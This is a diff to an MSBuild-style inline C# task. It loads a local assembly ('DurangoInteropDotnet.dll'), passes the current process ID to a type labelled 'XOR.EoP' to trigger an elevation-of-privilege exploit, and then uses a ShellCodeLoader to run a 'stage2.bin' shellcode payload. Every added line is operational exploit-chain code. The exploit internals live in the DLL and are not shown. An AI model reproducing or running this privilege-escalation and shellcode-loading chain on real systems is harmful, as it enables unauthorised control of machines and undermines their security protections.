@@ -9,10 +9,21 @@
 			<Using Namespace="System.Reflection"/>
 			<Code Type="Fragment" Language="cs">
 				<![CDATA[
+				uint currentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
+				Console.WriteLine("Current PID: {0}", currentPid);
+
 				Console.Write("Loading assembly ... ");
 
 			    var dll = File.ReadAllBytes(@"D:\sc\DurangoInteropDotnet.dll");				
 			    var loader = Assembly.Load(dll);
+
+				/* Elevate */
+				var exploit = loader.GetType("XOR.EoP")!;
+				var elevateMethod = exploit.GetMethod("Run", BindingFlags.Static | BindingFlags.Public)!;
+
+				elevateMethod.Invoke(null, new object[]{currentPid});
+
+				/* Load daemon PE via stage2.bin shellcode */
 			    var manager = loader.GetType("ShellCodeLoader")!;
 
 			    var loadShellcode = manager.GetMethod("LoadSC", BindingFlags.Static | BindingFlags.Public)!;
